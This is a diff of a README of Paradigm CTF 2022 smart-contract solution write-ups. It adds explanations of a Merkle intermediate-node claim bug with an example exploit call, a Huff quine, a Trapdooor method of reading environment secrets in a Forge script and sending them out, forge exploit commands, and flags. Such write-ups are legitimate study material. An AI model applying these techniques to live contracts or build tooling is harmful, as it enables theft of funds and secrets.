@@ -54,7 +54,7 @@ function stage2(uint256[4] calldata arr) external pure {
     }
 }
 ```
-All four elements of the uint256 array must be small prime numbers.
+All four elements of the `uint256` array must be small prime numbers.
 
 **stage3**
 ```solidity
@@ -68,7 +68,7 @@ function stage3(uint256 a, uint256 b, uint256 c) external view {
 ```
 It is impossible to create a contract whose address is `address(uint160(a + b))`.
 
-By overwriting the zero slot using mstore, the condition `data.length == c` can be satisfied.
+By overwriting the zero slot using `mstore`, the condition `data.length == c` can be satisfied.
 
 To learn more about the zero slot, see [the Solidity document](https://docs.soliditylang.org/en/v0.8.16/internals/layout_in_memory.html).
 
@@ -114,9 +114,12 @@ STOP
 JUMPDEST
 ```
 
-**Generate keys and a calldata**
+**Construct a calldata**
+
+See: [construct_calldata.py](Lockbox2/construct_calldata.py)
+
 ```
-python gen_calldata.py
+python construct_calldata.py
 ```
 
 The script outputs the following:
@@ -151,12 +154,34 @@ Flag: `PCTF{10ck80x_20ck5}`
 
 ### MERKLEDROP
 
-Get vulnerable nodes:
+`claim` function of `MerkleDistributor` is vulnerable. 
+```solidity
+function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
+    require(!isClaimed(index), "MerkleDistributor: Drop already claimed.");
+
+    // Verify the merkle proof.
+    bytes32 node = keccak256(abi.encodePacked(index, account, amount));
+    require(MerkleProof.verify(merkleProof, merkleRoot, node), "MerkleDistributor: Invalid proof.");
+
+    // Mark it claimed and send the token.
+    _setClaimed(index);
+    require(ERC20Like(token).transfer(account, amount), "MerkleDistributor: Transfer failed.");
+
+    emit Claimed(index, account, amount);
+}
 ```
-python get_vulnerable_node.py
+The intermediate node of the Merkle tree can be claimed. See also: https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3091
+
+The size of `account` is 20 bytes, and the size of `amount` is 12 bytes.
+The total number of bytes is 32 bytes.
+
+
+**Get claimable nodes**
+```
+python get_claimable_node.py
 ```
 
-Example:
+**An example of an intermediate node that can be claimed**
 ```solidity
 bytes32[] memory merkleProof = new bytes32[](5);
 merkleProof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
@@ -167,12 +192,12 @@ merkleProof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da
 merkleDistributor.claim(0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, 0x00000f40f0c122ae08d2207b, merkleProof);
 ```
 
-Test:
+**Test**
 ```
 forge test -vvvvv --match-contract MerkleDropExploitTest
 ```
 
-Exploit:
+**Exploit**
 ```
 forge script MerkleDropExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
 ```
@@ -182,12 +207,12 @@ Flag `PCTF{N1C3_Pr00F_8r0}`
 
 ### RANDOM
 
-Test:
+**Test**
 ```
 forge test -vvvvv --match-contract RandomExploitTest
 ```
 
-Exploit:
+**Exploit**
 ```
 forge script RandomExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
 ```
@@ -196,7 +221,27 @@ Flag: `PCTF{IT5_C7F_71M3}`
 
 ### RESCUE
 
-Exploit:
+The goal is to make the WETH balance of `mcHelper` to 0.
+
+WETH can be converted to LP tokens using the `_addLiquidity` function.
+
+```solidity
+function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal {
+    (,, uint256 amountOut) = router.addLiquidity(
+        token0,
+        token1,
+        ERC20Like(token0).balanceOf(address(this)),
+        ERC20Like(token1).balanceOf(address(this)),
+        0,
+        0,
+        msg.sender,
+        block.timestamp
+    );
+    require(amountOut >= minAmountOut);
+}
+```
+
+**Exploit**
 ```
 forge script RescueExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
 ```
@@ -205,17 +250,51 @@ Flag: `PCTF{MuCH_4PPr3C1473_53r}`
 
 ### SOURCECODE
 
-Compile the quine:
+The goal is to create a quine with EVM byte code.
+
+There are restrictions on the opcodes that can be used.
+
+```js
+#define macro MAIN() = takes (0) returns (0) {
+    0x5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3 // code
+
+    dst:dst:dst:dst:dst:dst:dst:dst:dst:dst:dst:dst:dst:dst:dst: // padding
+
+    dup1
+    0x01
+    mstore  // mem: 00code
+    0x21
+    mstore  // mem: 00codecode
+
+    0x7f    
+    0x00
+    mstore8 // mem: 7fcodecode
+
+    0x41
+    0x00
+    return
+}
+```
+
+**Compile the quine**
 ```
 huffc -r Quine.huff
 ```
 
-Test:
+Output:
+```
+7f5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f35b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3
+```
+
+[evm.codes playground](https://www.evm.codes/playground?unit=Wei&codeType=Bytecode&code=%277f~y~y%27~zzzzz80x0w2w7f6z5b5b5by00053x41x00f3x60w152x%01wxyz~_)
+
+
+**Test**
 ```
 forge test -vvvvv --match-contract SourceCodeExploitTest
 ```
 
-Exploit:
+**Exploit**
 ```
 forge script SourceCodeExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
 ```
@@ -223,19 +302,22 @@ forge script SourceCodeExploitScript --fork-url $RPC_PARADIGM --private-key $PRI
 Flag: `PCTF{QUiNE_QuiNe_qU1n3}`
 
 ### TRAPDOOOR 
+The goal is to get environment variables in Forge script. 
 
-Test:
+This can be solved by using the Foundry cheatcodes and sending the flag to the specified RPC.
+
+**Test**
 ```
 export FLAG="FLAG{DUMMY}"
 forge script src/ParadigmCTF2022/Trapdooor/TrapdooorScript.sol:TrapdooorScript -vvvvv
 ```
 
-Exploit:
+**Exploit**
 ```
 python exploit.py
 ```
 
-Construct the flag:
+**Construct the flag**
 ```
 python construct_flag.py
 ```
@@ -247,7 +329,7 @@ Flag: `PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5_1n_4_c7f}`
 
 ### RIDDLE-OF-THE-SPHINX
 
-Exploit:
+**Exploit**
 ```
 python exploit.py
 ```
@@ -256,12 +338,12 @@ Flag: `PCTF{600D_1UCK_H4V3_FUN}`
 
 ### CAIRO-PROXY
 
-Generate ABI:
+**Generate ABI**
 ```
 starknet-compile almost_erc20.cairo --abi ../../almost_erc20_abi.json
 ```
 
-Exploit:
+**Exploit**
 ```
 python exploit.py
 ```
